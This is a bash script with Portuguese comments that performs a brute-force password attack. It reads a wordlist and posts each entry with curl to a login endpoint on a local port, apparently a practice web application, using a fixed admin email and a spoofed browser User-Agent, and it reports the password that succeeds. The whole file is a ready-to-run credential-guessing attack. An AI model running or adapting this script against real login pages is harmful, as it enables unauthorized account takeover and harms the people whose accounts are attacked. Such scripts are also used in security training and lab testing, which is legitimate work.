#!/bin/bash
########################################################################################
# Script Name: brute_force.sh
# Description: Ataque de força bruta utilizando curl
# Author: https://github.com/jeanrafaellourenco
# Date: 31/10/2022
# Dependencies: curl
# Encode: UTF8
########################################################################################

senhas=$(cat ./best1050.txt)
array_senhas=($senhas)
clear

for senha in ${array_senhas[@]}; do
    echo -e "\t***** ATAQUE DE FORÇA BRUTA *****"
    status=$(curl -X POST 'http://127.0.0.1:3000/rest/user/login' \
        -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0" \
        -H "Content-Type: application/json" \
        --data-raw '{"email":"admin@lovestickersnerd.com","password":"'$senha'"}' \
        --compressed \
        -m 2 -o /dev/null -s -w "%{http_code}\n")
    [[ $status != 200 ]] && {
        echo -en "Senha '$senha' inválida - Status: $status"
        sleep 0.2
        clear
    } || {
        echo -e "Senha encontrada: $senha - Status: $status"
        exit 0
    }
done
